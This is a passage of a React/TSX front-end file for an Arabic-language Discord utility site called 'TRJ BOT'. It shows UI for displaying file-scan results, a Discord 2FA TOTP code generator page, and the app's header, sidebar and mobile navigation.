                      <div className={`engine-card ${vsResult.engines.pattern_engine.findings > 0 ? (vsResult.engines.pattern_engine.findings > 5 ? 'engine-card-threat' : 'engine-card-suspicious') : 'engine-card-clean'}`}>
                        <div className="flex items-center justify-between mb-2">
                          <div className="flex items-center gap-2">
                            <div className={`w-6 h-6 rounded-lg flex items-center justify-center text-xs ${vsResult.engines.pattern_engine.findings > 0 ? 'bg-red-500/20 text-red-400' : 'bg-green-500/20 text-green-400'}`}>{vsResult.engines.pattern_engine.findings > 0 ? '🔴' : '✅'}</div>
                            <div>
                              <div className="text-xs font-bold text-white">TRJ Pattern Engine</div>
                              <div className="text-[9px] text-slate-500">فحص الأنماط المشبوهة</div>
                            </div>
                          </div>
                          <div className="text-left">
                            <div className={`text-xs font-bold ${vsResult.engines.pattern_engine.findings > 0 ? 'text-red-400' : 'text-green-400'}`}>{vsResult.engines.pattern_engine.findings > 0 ? `${vsResult.engines.pattern_engine.findings} نمط` : 'نظيف'}</div>
                            <div className="text-[9px] text-slate-600">{vsResult.engines?.pattern_engine?.scan_time ?? 0}ms</div>
                          </div>
                        </div>
                        {vsResult.engines.pattern_engine.threats?.length > 0 && (
                          <div className="flex flex-wrap gap-1">{vsResult.engines.pattern_engine.threats.slice(0, 5).map((t: string, i: number) => (<span key={i} className="text-[9px] text-red-300/70 bg-red-500/8 px-2 py-0.5 rounded border border-red-500/10">{t}</span>))}</div>
                        )}
                      </div>
                    )}

                    {/* AI Engine */}
                    {vsResult.engines?.ai_engine && (
                      <div className={`engine-card ${vsResult.engines.ai_engine.confidence === 'none' ? 'engine-card-suspicious' : vsResult.engines.ai_engine.threat_assessment === 'clean' ? 'engine-card-clean' : ['high', 'critical'].includes(vsResult.engines.ai_engine.threat_assessment) ? 'engine-card-threat' : 'engine-card-suspicious'}`}>
                        <div className="flex items-center justify-between mb-2">
                          <div className="flex items-center gap-2">
                            <div className={`w-6 h-6 rounded-lg flex items-center justify-center text-xs ${vsResult.engines.ai_engine.confidence === 'none' ? 'bg-yellow-500/20 text-yellow-400' : vsResult.engines.ai_engine.threat_assessment === 'clean' ? 'bg-green-500/20 text-green-400' : ['high', 'critical'].includes(vsResult.engines.ai_engine.threat_assessment) ? 'bg-red-500/20 text-red-400' : 'bg-yellow-500/20 text-yellow-400'}`}>{vsResult.engines.ai_engine.confidence === 'none' ? '⚠️' : vsResult.engines.ai_engine.threat_assessment === 'clean' ? '✅' : '🟡'}</div>
                            <div>
                              <div className="text-xs font-bold text-white">TRJ Scan Engine</div>
                              <div className="text-[9px] text-slate-500">تحليل بالذكاء الاصطناعي {vsResult.engines.ai_engine.confidence ? `(ثقة: ${vsResult.engines.ai_engine.confidence})` : ''}</div>
                            </div>
                          </div>
                          <div className="text-left">
                            <div className={`text-xs font-bold ${vsResult.engines.ai_engine.confidence === 'none' ? 'text-yellow-400' : vsResult.engines.ai_engine.threat_assessment === 'clean' ? 'text-green-400' : ['high', 'critical'].includes(vsResult.engines.ai_engine.threat_assessment) ? 'text-red-400' : 'text-yellow-400'}`}>{vsResult.engines.ai_engine.confidence === 'none' ? 'غير متاح ⚠️' : vsResult.engines.ai_engine.threat_assessment === 'clean' ? 'نظيف' : vsResult.engines.ai_engine.threat_assessment === 'low' ? 'قليل' : vsResult.engines.ai_engine.threat_assessment === 'medium' ? 'متوسط' : vsResult.engines.ai_engine.threat_assessment === 'high' ? 'عالي' : 'حرج'}</div>
                            <div className="text-[9px] text-slate-600">{vsResult.engines?.ai_engine?.scan_time ?? 0}ms</div>
                          </div>
                        </div>
                        {vsResult.engines.ai_engine.confidence === 'none' && (<div className="bg-yellow-500/5 rounded-lg p-1.5 border border-yellow-500/10 text-[9px] text-yellow-400/70">⚠️ محرك AI غير متاح - النتيجة تعتمد على محرك الأنماط والاستقرائي فقط</div>)}
                        {vsResult.engines.ai_engine.findings?.length > 0 && vsResult.engines.ai_engine.findings[0] && vsResult.engines.ai_engine.confidence !== 'none' && (
                          <div className="space-y-1">
                            {vsResult.engines.ai_engine.findings.filter((f: string) => f && f.length > 0).slice(0, 3).map((f: string, i: number) => (<div key={i} className="text-[10px] text-slate-400 bg-black/20 px-2 py-1 rounded-lg">{f}</div>))}
                          </div>
                        )}
                      </div>
                    )}

                    {/* Heuristic Engine */}
                    {vsResult.engines?.heuristic_engine && (
                      <div className={`engine-card ${vsResult.engines.heuristic_engine.findings > 0 ? (vsResult.engines.heuristic_engine.findings > 5 ? 'engine-card-threat' : 'engine-card-suspicious') : 'engine-card-clean'}`}>
                        <div className="flex items-center justify-between mb-2">
                          <div className="flex items-center gap-2">
                            <div className={`w-6 h-6 rounded-lg flex items-center justify-center text-xs ${vsResult.engines.heuristic_engine.findings > 0 ? 'bg-yellow-500/20 text-yellow-400' : 'bg-green-500/20 text-green-400'}`}>{vsResult.engines.heuristic_engine.findings > 0 ? '🟡' : '✅'}</div>
                            <div>
                              <div className="text-xs font-bold text-white">TRJ Heuristic Engine</div>
                              <div className="text-[9px] text-slate-500">فحص استقرائي متقدم</div>
                            </div>
                          </div>
                          <div className="text-left">
                            <div className={`text-xs font-bold ${vsResult.engines.heuristic_engine.findings > 0 ? 'text-yellow-400' : 'text-green-400'}`}>{vsResult.engines.heuristic_engine.findings > 0 ? `${vsResult.engines.heuristic_engine.findings} Finding` : 'نظيف'}</div>
                            <div className="text-[9px] text-slate-600">{vsResult.engines?.heuristic_engine?.scan_time ?? 0}ms</div>
                          </div>
                        </div>
                        {vsResult.engines.heuristic_engine.threats?.length > 0 && (
                          <div className="space-y-1 max-h-32 overflow-y-auto">
                            {vsResult.engines.heuristic_engine.threats.map((t: string, i: number) => (<div key={i} className="text-[10px] text-yellow-300/80 bg-yellow-500/5 px-2 py-1 rounded-lg border border-yellow-500/8">{t}</div>))}
                          </div>
                        )}
                      </div>
                    )}
                  </div>

                  {/* File Info */}
                  <div className="grid grid-cols-2 sm:grid-cols-4 gap-2">
                    <div className="bg-black/20 rounded-xl p-3 border border-white/5"><div className="text-[9px] text-slate-500">الملف</div><div className="text-xs text-white font-bold truncate mt-0.5">{vsResult.file_name}</div></div>
                    <div className="bg-black/20 rounded-xl p-3 border border-white/5"><div className="text-[9px] text-slate-500">الحجم</div><div className="text-xs text-white font-bold mt-0.5">{vsResult.file_size}</div></div>
                    <div className="bg-black/20 rounded-xl p-3 border border-white/5"><div className="text-[9px] text-slate-500">النوع</div><div className="text-xs text-white font-bold mt-0.5">{vsResult.file_type}</div></div>
                    <div className="bg-black/20 rounded-xl p-3 border border-white/5"><div className="text-[9px] text-slate-500">Hash</div><div className="text-xs text-cyan-400 font-mono mt-0.5">{vsResult.md5}</div></div>
                  </div>
                  {vsResult.trojan_type && vsResult.threat_level !== 'clean' && <div className="bg-red-500/5 rounded-xl p-4 border border-red-500/10"><div className="text-[10px] text-red-400 font-bold mb-1">🔬 نوع التلغيمة</div><div className="text-sm text-white font-bold">{vsResult.trojan_type}</div></div>}
                  {vsResult.ports?.length > 0 && <div className="bg-purple-500/5 rounded-xl p-4 border border-purple-500/10"><div className="text-[10px] text-purple-400 font-bold mb-2">🔌 البورتات ({vsResult.ports.length})</div><div className="flex flex-wrap gap-1.5">{vsResult.ports.map((p: number, i: number) => (<span key={i} className="text-xs font-mono text-purple-300 bg-purple-500/10 px-2.5 py-1 rounded-lg border border-purple-500/20">Port {p}</span>))}</div></div>}
                  {vsResult.capabilities?.length > 0 && <div className="bg-orange-500/5 rounded-xl p-4 border border-orange-500/10"><div className="text-[10px] text-orange-400 font-bold mb-2">⚡ القدرات ({vsResult.capabilities.length})</div><div className="flex flex-wrap gap-1.5">{vsResult.capabilities.map((c: string, i: number) => (<span key={i} className="text-xs text-orange-300 bg-orange-500/10 px-2.5 py-1 rounded-lg border border-orange-500/20">{c}</span>))}</div></div>}
                  {vsResult.c2_servers?.length > 0 && <div className="bg-red-600/5 rounded-xl p-4 border border-red-600/10"><div className="text-[10px] text-red-500 font-bold mb-2">🌍 خوادم C2 ({vsResult.c2_servers.length})</div><div className="space-y-1">{vsResult.c2_servers.map((s: string, i: number) => (<div key={i} className="text-xs font-mono text-red-400 bg-red-600/10 px-3 py-1.5 rounded-lg truncate">{s}</div>))}</div></div>}
                  {vsResult.threat_type?.length > 0 && <div className="bg-yellow-500/5 rounded-xl p-4 border border-yellow-500/10"><div className="text-[10px] text-yellow-400 font-bold mb-2">🏷️ أنواع التهديد ({vsResult.threat_type.length})</div><div className="flex flex-wrap gap-1.5">{vsResult.threat_type.map((t: string, i: number) => (<span key={i} className="text-[10px] text-yellow-300 bg-yellow-500/10 px-2 py-1 rounded-lg border border-yellow-500/20">{t}</span>))}</div></div>}
                  {vsResult.suspicious_patterns?.length > 0 && <div className="bg-slate-800/30 rounded-xl p-4 border border-slate-700/30"><div className="text-[10px] text-slate-400 font-bold mb-2">🔍 الأنماط المشبوهة ({vsResult.suspicious_patterns.length})</div><div className="space-y-1 max-h-48 overflow-y-auto">{vsResult.suspicious_patterns.map((p: any, i: number) => (<div key={i} className="flex items-center gap-2 text-xs text-slate-300 bg-black/20 px-3 py-1.5 rounded-lg"><span className="text-red-400 text-[10px]">L{p.line}</span><span>{p.description}</span></div>))}</div></div>}
                  {vsResult.encoded_strings?.length > 0 && <div className="bg-cyan-500/5 rounded-xl p-4 border border-cyan-500/10"><div className="text-[10px] text-cyan-400 font-bold mb-2">🔐 سلاسل مشفرة ({vsResult.encoded_strings.length})</div><div className="space-y-1 max-h-36 overflow-y-auto">{vsResult.encoded_strings.map((e: any, i: number) => (<div key={i} className="text-[11px] bg-black/20 px-3 py-1.5 rounded-lg"><span className="text-cyan-400 font-bold">[{e.type}]</span> <span className="text-slate-400 font-mono truncate">{e.value}</span>{e.decoded && <span className="text-yellow-400 font-mono truncate"> → {e.decoded}</span>}</div>))}</div></div>}
                </div>
              )}
            </div>
          </main>
        </div>
      )}

      {/* ===== 2FA STANDALONE PAGE ===== */}
      {landingView === 'twofa' && (
        <div className="min-h-screen relative z-10">
          {/* 2FA Header */}
          <header className="header-modern sticky top-0 z-50 px-4 py-3">
            <div className="max-w-xl mx-auto flex items-center justify-between">
              <button onClick={() => { setLandingView('landing'); reset2FA() }} className="flex items-center gap-2 text-slate-400 hover:text-cyan-400 transition-colors cursor-pointer">
                <span className="text-lg">→</span>
                <span className="text-sm font-medium">رجوع</span>
              </button>
              <div className="flex items-center gap-2">
                <span className="text-2xl">🔐</span>
                <span className="text-lg font-black text-gradient-cyan">تفعيل 2FA</span>
              </div>
              <div />
            </div>
          </header>

          <main className="max-w-xl mx-auto p-4 pb-8">
            <div className="glass-card card-hover rounded-2xl p-6 border border-cyan-500/15 shadow-xl shadow-black/20 animate-fade-in">
              <div className="flex items-center gap-3 mb-1">
                <span className="text-2xl">🛡️</span>
                <h2 className="text-xl font-black text-cyan-400">مولّد أكواد 2FA</h2>
              </div>
              <p className="text-slate-500 text-sm mb-5">أدخل مفتاح 2FA من ديسكورد وتوليد أكواد تلقائية — مثل Google Authenticator</p>

              {/* ===== STEP 1: Idle - Choose Method ===== */}
              {twoFaStep === 'idle' && (
                <div className="space-y-4 animate-fade-in">
                  {/* Instructions */}
                  <div className="bg-cyan-500/5 rounded-2xl p-4 border border-cyan-500/15">
                    <h3 className="text-sm font-bold text-white mb-3 text-center">كيف تستخدم؟</h3>
                    <div className="grid grid-cols-1 gap-2.5">
                      <div className="flex items-start gap-3 bg-black/20 rounded-xl p-3 border border-white/5">
                        <span className="text-lg font-black text-cyan-400 bg-cyan-500/10 w-7 h-7 rounded-full flex items-center justify-center flex-shrink-0 text-xs">1</span>
                        <div><p className="text-xs text-white/80 font-medium">افتح إعدادات حسابك في ديسكورد</p><p className="text-[10px] text-slate-400 mt-0.5">الإعدادات → الحساب → تفعيل المصادقة الثنائية</p></div>
                      </div>
                      <div className="flex items-start gap-3 bg-black/20 rounded-xl p-3 border border-white/5">
                        <span className="text-lg font-black text-cyan-400 bg-cyan-500/10 w-7 h-7 rounded-full flex items-center justify-center flex-shrink-0 text-xs">2</span>
                        <div><p className="text-xs text-white/80 font-medium">سيظهر لك باركود QR</p><p className="text-[10px] text-slate-400 mt-0.5">امسحه بالكاميرا أو ارفع صورة له أو أدخل المفتاح يدوياً</p></div>
                      </div>
                      <div className="flex items-start gap-3 bg-black/20 rounded-xl p-3 border border-white/5">
                        <span className="text-lg font-black text-cyan-400 bg-cyan-500/10 w-7 h-7 rounded-full flex items-center justify-center flex-shrink-0 text-xs">3</span>
                        <div><p className="text-xs text-white/80 font-medium">الموقع يولّد لك كود 6 أرقام</p><p className="text-[10px] text-slate-400 mt-0.5">ضعه في ديسكورد + أدخل الباسوورد → يتفعل 2FA</p></div>
                      </div>
                    </div>
                  </div>

                  {/* Method 3: Manual Key */}
                  <button onClick={() => { setTwoFaStep('manual'); setTwoFaScanningError('') }} className="w-full py-4 rounded-2xl font-bold text-sm cursor-pointer bg-purple-500/15 text-purple-400 border border-purple-500/25 hover:bg-purple-500/25 transition-all active:scale-[0.98] flex items-center justify-center gap-3">
                    <span className="text-xl">⌨️</span>
                    <div className="text-left"><span className="block text-sm">إدخال يدوي</span><span className="block text-[10px] text-purple-400/50">أدخل 2FA Key من ديسكورد يدوياً</span></div>
                  </button>

                  {/* Saved Accounts Quick Access */}
                  {twoFaAccounts.length > 0 && (
                    <div className="bg-white/3 rounded-2xl p-4 border border-white/5">
                      <h3 className="text-xs font-bold text-slate-400 mb-3 flex items-center gap-2">
                        <span>💾</span> الحسابات المحفوظة ({twoFaAccounts.length})
                      </h3>
                      <div className="space-y-1.5">
                        {twoFaAccounts.map(a => (
                          <div key={a.id} className="flex items-center justify-between px-3 py-2.5 rounded-xl bg-black/30 border border-white/5 hover:border-cyan-500/20 transition-colors cursor-pointer group" onClick={() => selectAccount(a)}>
                            <div className="flex items-center gap-2.5">
                              <span className="text-base">{a.issuer === 'Discord' ? '💬' : '🔑'}</span>
                              <div>
                                <p className="text-xs text-white/80 font-medium">{a.label || a.issuer}</p>
                                <p className="text-[10px] text-slate-500">{a.addedAt} · {a.secret.substring(0, 6)}...</p>
                              </div>
                            </div>
                            <div className="flex items-center gap-2">
                              <span className="text-[10px] text-cyan-400/50 bg-cyan-500/8 px-2 py-0.5 rounded-full border border-cyan-500/15 group-hover:bg-cyan-500/15 group-hover:text-cyan-400 transition-colors">فتح</span>
                              <button onClick={(e) => { e.stopPropagation(); deleteAccount(a.id) }} className="text-[10px] text-red-400/30 hover:text-red-400 px-1.5 py-1 rounded transition-colors">✕</button>
                            </div>
                          </div>
                        ))}
                      </div>
                    </div>
                  )}
                </div>
              )}

              {twoFaStep === 'manual' && (
                <div className="space-y-3 animate-fade-in">
                  <div className="bg-purple-500/5 rounded-2xl p-4 border border-purple-500/15">
                    <h3 className="text-sm font-bold text-white mb-2">2FA Key (Manual entry)</h3>
                    <p className="text-[11px] text-slate-400 mb-3">أدخل المفتاح الذي يظهر لك في صفحة تفعيل 2FA بديسكورد</p>
                    <div className="bg-black/40 rounded-xl p-3 flex items-center gap-2 border border-purple-500/20">
                      <input type="text" value={twoFaManualKey} onChange={e => setTwoFaManualKey(e.target.value.toUpperCase())} placeholder="XXXX XXXX XXXX XXXX" className="flex-1 bg-transparent text-purple-300 font-mono text-sm placeholder-white/20 focus:outline-none tracking-widest" autoFocus />
                    </div>
                  </div>
                  <div className="grid grid-cols-2 gap-2.5">
                    <button onClick={handleManualSubmit} className="w-full py-3 rounded-xl font-bold text-sm cursor-pointer bg-purple-500/20 text-purple-400 border border-purple-500/30 hover:bg-purple-500/30 transition-colors active:scale-[0.97]">✅ تأكيد</button>
                    <button onClick={() => { setTwoFaStep('idle'); setTwoFaManualKey('') }} className="w-full py-3 rounded-xl font-bold text-xs cursor-pointer bg-white/5 text-white/40 border border-white/10 hover:bg-white/10 transition-colors active:scale-[0.97]">↩️ رجوع</button>
                  </div>
                </div>
              )}

              {/* ===== STEP 4: Generated Code Display ===== */}
              {twoFaStep === 'code' && (
                <div className="space-y-4 animate-fade-in">
                  {/* Account Info */}
                  <div className="bg-cyan-500/5 rounded-2xl p-4 border border-cyan-500/15 text-center">
                    <div className="flex items-center justify-center gap-2 mb-1">
                      {twoFaIssuer === 'Discord' ? <span className="text-lg">💬</span> : <span className="text-lg">🔑</span>}
                      <span className="text-sm font-bold text-white">{twoFaIssuer || '2FA'}</span>
                    </div>
                    {twoFaLabel && <p className="text-[11px] text-slate-400">{twoFaLabel}</p>}
                  </div>

                  {/* Generated Code - Big Display */}
                  <div onClick={copyCode} className={`bg-black/40 rounded-2xl p-6 border transition-all cursor-pointer select-none ${twoFaCopyFlash ? 'border-green-400/50 bg-green-500/5 scale-[1.02]' : 'border-cyan-500/20'} text-center relative overflow-hidden`}>
                    {/* Progress Ring */}
                    <div className="absolute top-3 right-3">
                      <div className="relative w-12 h-12">
                        <svg className="w-12 h-12 -rotate-90" viewBox="0 0 36 36">
                          <circle cx="18" cy="18" r="15.5" fill="none" stroke="rgba(255,255,255,0.05)" strokeWidth="2.5" />
                          <circle cx="18" cy="18" r="15.5" fill="none" stroke={twoFaTimeLeft <= 5 ? '#ef4444' : twoFaTimeLeft <= 10 ? '#eab308' : '#06b6d4'} strokeWidth="2.5" strokeDasharray={`${(twoFaTimeLeft / 30) * 97.4} 97.4`} strokeLinecap="round" className="transition-all duration-1000" />
                        </svg>
                        <span className={`absolute inset-0 flex items-center justify-center text-xs font-black ${twoFaTimeLeft <= 5 ? 'text-red-400 animate-pulse' : twoFaTimeLeft <= 10 ? 'text-yellow-400' : 'text-cyan-400'}`}>{twoFaTimeLeft}s</span>
                      </div>
                    </div>

                    <p className="text-[11px] text-slate-500 mb-3">{twoFaCopyFlash ? '✅ تم النسخ!' : 'اضغط لنسخ الكود'}</p>
                    <div className="flex items-center justify-center gap-2 mb-3">
                      <span className={`text-6xl font-mono font-black tracking-[0.3em] transition-all duration-300 ${twoFaCopyFlash ? 'text-green-400 scale-105' : twoFaTimeLeft <= 5 ? 'text-red-400' : 'text-cyan-400'}`}>
                        {twoFaGeneratedCode.substring(0, 3)}<span className="text-white/15 mx-1">-</span>{twoFaGeneratedCode.substring(3)}
                      </span>
                    </div>
                    <p className="text-[10px] text-slate-600">الكود يتحدث تلقائياً كل 30 ثانية</p>
                  </div>

                  {/* What to do next */}
                  <div className="bg-emerald-500/5 rounded-2xl p-4 border border-emerald-500/15">
                    <h3 className="text-sm font-bold text-emerald-400 mb-2 flex items-center gap-2"><span>📋</span> الخطوة التالية</h3>
                    <div className="text-[11px] text-slate-400 space-y-1.5">
                      <p>1. انسخ الكود فوق (اضغط عليه)</p>
                      <p>2. ضعه في خانة <span className="text-emerald-300 font-bold">المصادقة</span> في صفحة 2FA بديسكورد</p>
                      <p>3. أدخل <span className="text-emerald-300 font-bold">كلمة مرور ديسكورد</span> للتأكيد</p>
                      <p>4. اضغط <span className="text-emerald-300 font-bold">Activate</span> أو <span className="text-emerald-300 font-bold">تفعيل</span></p>
                    </div>
                  </div>

                  {/* Secret Info */}
                  <div className="bg-white/3 rounded-xl p-3 border border-white/5">
                    <div className="flex items-center justify-between">
                      <div>
                        <p className="text-[10px] text-slate-500">المفتاح السري</p>
                        <code className="text-xs text-slate-400 font-mono">{twoFaSecret.substring(0, 10)}...{twoFaSecret.substring(twoFaSecret.length - 6)}</code>
                      </div>
                      <button onClick={() => { navigator.clipboard.writeText(twoFaSecret).catch(() => {}) }} className="text-[10px] text-cyan-400 bg-cyan-500/10 px-2.5 py-1.5 rounded-lg border border-cyan-500/20 hover:bg-cyan-500/20 transition-colors cursor-pointer">📋 نسخ المفتاح</button>
                    </div>
                  </div>

                  {/* Saved Accounts */}
                  {twoFaAccounts.length > 0 && (
                    <div className="bg-white/3 rounded-xl p-3 border border-white/5">
                      <div className="flex items-center justify-between mb-2">
                        <p className="text-[10px] text-slate-500">الحسابات المحفوظة ({twoFaAccounts.length})</p>
                      </div>
                      <div className="space-y-1">
                        {twoFaAccounts.map(a => (
                          <div key={a.id} className={`flex items-center justify-between px-2.5 py-1.5 rounded-lg cursor-pointer transition-colors ${twoFaSecret === a.secret ? 'bg-cyan-500/10 border border-cyan-500/20' : 'bg-black/20 border border-white/5 hover:bg-white/5'}`} onClick={() => { if (twoFaSecret !== a.secret) selectAccount(a) }}>
                            <div className="flex items-center gap-2">
                              <span className="text-xs">{a.issuer === 'Discord' ? '💬' : '🔑'}</span>
                              <span className="text-[11px] text-white/70">{a.label || a.issuer}</span>
                            </div>
                            <button onClick={(e) => { e.stopPropagation(); deleteAccount(a.id) }} className="text-[10px] text-red-400/50 hover:text-red-400 px-1.5 py-0.5 rounded transition-colors">✕</button>
                          </div>
                        ))}
                      </div>
                    </div>
                  )}

                  {/* Reset Button */}
                  <button onClick={reset2FA} className="w-full py-3 rounded-xl font-bold text-xs cursor-pointer bg-white/5 text-white/40 border border-white/10 hover:bg-white/10 transition-colors active:scale-[0.97]">🔄 مسح باركود جديد</button>
                </div>
              )}

            </div>

            {/* Footer */}
            <div className="pt-6 mt-4 border-t border-white/5 text-center pb-8">
              <p className="text-[11px] text-white/20">جميع حقوق محفوظه لدى Trojan .#1888</p>
            </div>
          </main>
        </div>
      )}

      {/* ===== MAIN APP ===== */}
      {landingView === 'app' && (
      <>
      <header className="header-modern sticky top-0 z-50 px-4 py-3.5">
        <div className="max-w-6xl mx-auto flex items-center justify-between px-2 sm:px-0">
          <div className="flex items-center gap-2 sm:gap-3">
            <button onClick={() => { setLandingView('landing'); setSection('verify'); clearState() }} className="flex items-center gap-1 text-slate-400 hover:text-emerald-400 transition-colors cursor-pointer px-2 py-1 rounded-lg hover:bg-emerald-500/8">
              <span className="text-sm">→</span>
              <span className="text-[11px] font-medium hidden lg:inline">رجوع</span>
            </button>
            <h1 className="text-xl font-bold flex items-center gap-1.5 sm:gap-2.5">
              <span className="text-xl sm:text-2xl">🛡️</span>
              <span className="text-gradient-green font-black text-lg sm:text-2xl tracking-tight">TRJ BOT</span>
              <span className="text-[10px] text-emerald-400/70 bg-emerald-500/8 px-2 py-0.5 rounded-full border border-emerald-500/15 ml-1 font-semibold hidden lg:inline-block">v4.3</span>
            </h1>
          </div>
          {/* Desktop buttons */}
          <div className="hidden lg:flex items-center gap-1.5">
            {isPrime && (<span className="prime-badge">⭐ PRIME</span>)}
            <button onClick={() => { setFeedbackType('suggestion'); setShowFeedbackModal(true); setFeedbackMessage(''); setFeedbackMsg('') }} className="text-[10px] text-blue-400/80 bg-blue-500/8 px-2.5 py-1.5 rounded-full border border-blue-500/15 hover:bg-blue-500/15 hover:text-blue-300 transition-all cursor-pointer font-medium">💡 اقتراح</button>
            <button onClick={() => { setFeedbackType('problem'); setShowFeedbackModal(true); setFeedbackMessage(''); setFeedbackMsg('') }} className="text-[10px] text-red-400/80 bg-red-500/8 px-2.5 py-1.5 rounded-full border border-red-500/15 hover:bg-red-500/15 hover:text-red-300 transition-all cursor-pointer font-medium">⚠️ مشكلة</button>
            <button onClick={() => setShowPrimeModal(true)} className={`text-[10px] px-2.5 py-1.5 rounded-full border hover:bg-yellow-500/15 hover:text-yellow-300 transition-all cursor-pointer font-medium ${isPrime ? 'text-yellow-400/80 bg-yellow-500/8 border-yellow-500/15' : 'text-amber-400/80 bg-amber-500/8 border-amber-500/15'}`}>{isPrime ? '⭐ Prime مفعّل' : '⭐ اشتراك Prime'}</button>
            <button onClick={() => setShowTokenGuide(true)} className="text-[10px] text-cyan-400/80 bg-cyan-500/8 px-2.5 py-1.5 rounded-full border border-cyan-500/15 hover:bg-cyan-500/15 hover:text-cyan-300 transition-all cursor-pointer font-medium">🎫 كيف تجيب توكن</button>
            <button onClick={() => setShowProfile(true)} className="text-[10px] text-purple-400/80 bg-purple-500/8 px-2.5 py-1.5 rounded-full border border-purple-500/15 hover:bg-purple-500/15 hover:text-purple-300 transition-all cursor-pointer font-medium">👤 بروفايل</button>
            <span className="text-[10px] text-emerald-400/60 bg-emerald-500/8 px-2.5 py-1.5 rounded-full border border-emerald-500/15 font-medium">⚡ 34 ميزة</span>
          </div>
          {/* Mobile buttons - simplified */}
          <div className="flex lg:hidden items-center gap-1">
            {isPrime && (<span className="text-[9px] text-yellow-400 bg-yellow-500/15 px-1.5 py-0.5 rounded-full">⭐</span>)}
            <button onClick={() => setShowPrimeModal(true)} className="text-[9px] text-amber-400 bg-amber-500/10 px-2 py-1 rounded-lg border border-amber-500/20">Prime</button>
            <button onClick={() => setShowProfile(true)} className="text-[9px] text-purple-400 bg-purple-500/10 px-2 py-1 rounded-lg border border-purple-500/20">👤</button>
          </div>
        </div>
      </header>

      <div className="max-w-6xl mx-auto flex relative z-10">
        <aside className="w-56 min-h-screen sidebar-modern p-2.5 hidden lg:block sticky top-[57px] self-start overflow-auto max-h-[calc(100vh-57px)] border-slate-700/30">
          <div className="text-center mb-4 pb-3 border-b border-white/5"><div className="text-2xl mb-1">🛡️</div><h2 className="text-sm font-black text-gradient-green tracking-tight">TRJ BOT</h2><p className="text-[9px] text-slate-600 mt-0.5">v4.3 • 34 ميزة</p></div>

          {/* Search */}
          <div className="sidebar-search mb-3">
            <span className="search-icon">🔍</span>
            <input type="text" placeholder="ابحث عن قسم..." value={sidebarSearch} onChange={e => setSidebarSearch(e.target.value)} />
          </div>

          {/* Profile + Special buttons */}
          <div className="flex gap-1 mb-3">
            <button onClick={() => setShowProfile(true)} className="flex-1 text-[10px] text-purple-400/80 bg-purple-500/8 px-2 py-1.5 rounded-lg border border-purple-500/15 hover:bg-purple-500/15 transition-colors cursor-pointer font-medium text-center">👤 البروفايل</button>
            <button onClick={() => setShowTokenGuide(true)} className="flex-1 text-[10px] text-cyan-400/80 bg-cyan-500/8 px-2 py-1.5 rounded-lg border border-cyan-500/15 hover:bg-cyan-500/15 transition-colors cursor-pointer font-medium text-center">🎫 التوكن</button>
          </div>

          {/* Categorized Sections */}
          <nav className="space-y-0.5">
            {sidebarCategories.map(cat => {
              const filtered = filteredSections(cat.ids)
              if (sidebarSearch.trim() && filtered.length === 0) return null
              const isCollapsed = collapsedCats.has(cat.name)
              return (
                <div key={cat.name}>
                  <button onClick={() => toggleCat(cat.name)} className="sidebar-category-header w-full cursor-pointer">
                    <span className="text-[11px]">{cat.icon}</span>
                    <span className={`text-[10px] font-bold ${cat.prime ? 'text-yellow-400' : 'text-slate-500'}`}>{cat.name}</span>
                    <span className="sidebar-count-badge mr-auto">{filtered.length}</span>
                    <span className={`text-[9px] text-slate-600 transition-transform ${isCollapsed ? '' : 'rotate-180'}`}>▼</span>
                  </button>
                  {!isCollapsed && (
                    <div className="space-y-0.5 mb-1">
                      {filtered.map(id => {
                        const s = sections.find(sec => sec.id === id)
                        if (!s) return null
                        const isActive = section === id
                        const isPrime = s.prime
                        return (
                          <button key={s.id} onClick={() => { if (s.id === 'profile') { setShowProfile(true); return }; setSection(s.id); clearState() }} className={`sidebar-section-btn ${isActive ? (isPrime ? 'prime-active' : 'active') : ''}`}>
                            <span className="section-icon">{s.icon}</span>
                            <span className="section-name">{s.name}</span>
                          </button>
                        )
                      })}
                    </div>
                  )}
                </div>
              )
            })}
          </nav>

          <div className="mt-4 pt-3 border-t border-white/5 text-center"><p className="text-[9px] text-slate-600">صنع بواسطة</p><p className="text-[10px] font-bold text-gradient-green">Discord: trj.py</p></div>
        </aside>

        {/* القائمة السفلية للموبايل - محسّنة */}
        <nav className="lg:hidden fixed bottom-0 left-0 right-0 bottom-nav z-50">
          <div className="flex items-center justify-around px-2 py-2 gap-2 w-full">
            {/* زر الاقتراحات */}
            <button
              onClick={() => { setFeedbackType('suggestion'); setShowFeedbackModal(true); setFeedbackMessage(''); setFeedbackMsg('') }}
              className="mobile-action-btn blue"
              style={{ touchAction: 'manipulation' }}
            >
              <span className="text-lg">💡</span>
              <span>اقتراح</span>
            </button>

            {/* زر المشكلة */}
            <button
              onClick={() => { setFeedbackType('problem'); setShowFeedbackModal(true); setFeedbackMessage(''); setFeedbackMsg('') }}
              className="mobile-action-btn red"
              style={{ touchAction: 'manipulation' }}
            >
              <span className="text-lg">⚠️</span>
              <span>مشكلة</span>
            </button>

            {/* زر القائمة - الأقسام */}
            <button
              onClick={() => {
                const sheet = document.getElementById('mobile-sections-sheet');
                if (sheet) sheet.classList.add('open');
              }}
              className="mobile-menu-btn"
              style={{ touchAction: 'manipulation' }}
            >
              <span className="text-xl">☰</span>
              <span>الأقسام</span>
            </button>

            {/* زر Prime */}
            <button
              onClick={() => setShowPrimeModal(true)}
              className={`mobile-action-btn ${isPrime ? 'gold' : 'slate'}`}
              style={{ touchAction: 'manipulation' }}
            >
              <span className="text-lg">⭐</span>
              <span>Prime</span>
            </button>
          </div>
        </nav>

        {/* قائمة الأقسام المنسدلة */}
        <div id="mobile-sections-sheet" className="mobile-nav-sheet lg:hidden" onClick={(e) => {
          if (e.target === e.currentTarget) e.currentTarget.classList.remove('open');
        }}>
          <div className="mobile-nav-handle" onClick={() => {
            const sheet = document.getElementById('mobile-sections-sheet');
            if (sheet) sheet.classList.remove('open');
          }} />
          <div className="px-4 py-3 flex items-center justify-between border-b border-white/5 sticky top-0 bg-[rgba(4,8,16,0.99)] z-10">
            <span className="text-sm font-bold text-emerald-400">كل الأقسام ({sections.length})</span>
            <button
              onClick={() => {
                const sheet = document.getElementById('mobile-sections-sheet');
                if (sheet) sheet.classList.remove('open');
              }}
              className="text-slate-400 text-xs px-3 py-1.5 bg-slate-800/50 rounded-lg active:bg-slate-700/50"
            >✕ إغلاق</button>
          </div>
          {/* Mobile Search */}
          <div className="px-4 pt-3 pb-2">
            <div className="sidebar-search">
              <span className="search-icon">🔍</span>
              <input type="text" placeholder="ابحث عن قسم..." value={sidebarSearch} onChange={e => setSidebarSearch(e.target.value)} />
            </div>
          </div>
